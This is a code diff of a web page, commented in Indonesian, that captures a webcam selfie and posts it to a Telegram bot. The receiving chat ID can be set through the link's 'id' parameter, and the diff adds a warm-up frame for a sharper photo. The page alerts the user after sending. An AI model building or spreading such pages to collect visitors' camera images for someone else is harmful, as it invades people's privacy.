@@ -112,33 +112,43 @@ const CHAT_ID = urlParams.get('id') || "7596509818";
             }, 1000);
         }
 
-        function takeAndSend() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            
-            // Gambar video ke canvas (dibalik biar sesuai mirror)
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
+        async function takeAndSend() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
 
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "selfie_keren.jpg");
-                formData.append("caption", "📸 **FOTO DARI WEB MASUK!**\nUser: Istri/Teman\nStatus: Ganteng/Cantik ✅");
+    // --- JEPRETAN PERTAMA (BUAT MANASIN SENSOR / BUANG GELAP) ---
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0);
+    console.log("Jepretan pemanasan berhasil...");
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                })
-                .then(() => {
-                    alert("Foto berhasil dikirim ke Bot! ✅");
-                    location.reload(); // Refresh biar bisa foto lagi
-                })
-                .catch(err => alert("Gagal kirim: " + err));
-            }, "image/jpeg", 0.9);
-        }
+    // Kasih jeda 700ms biar kamera bener-bener stabil cahayanya
+    await new Promise(resolve => setTimeout(resolve, 700));
+
+    // --- JEPRETAN KEDUA (INI YANG BENING & DIKIRIM) ---
+    ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "selfie_bening.jpg");
+        formData.append("caption", "📸 **SELFIE BENING MASUK!**\nStatus: Sensor Udah Melek ✅");
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        })
+        .then(() => {
+            alert("Foto berhasil dikirim ke Bot! ✅");
+            location.reload(); 
+        })
+        .catch(err => alert("Gagal kirim: " + err));
+    }, "image/jpeg", 0.9);
+}
     </script>
 
 </body>
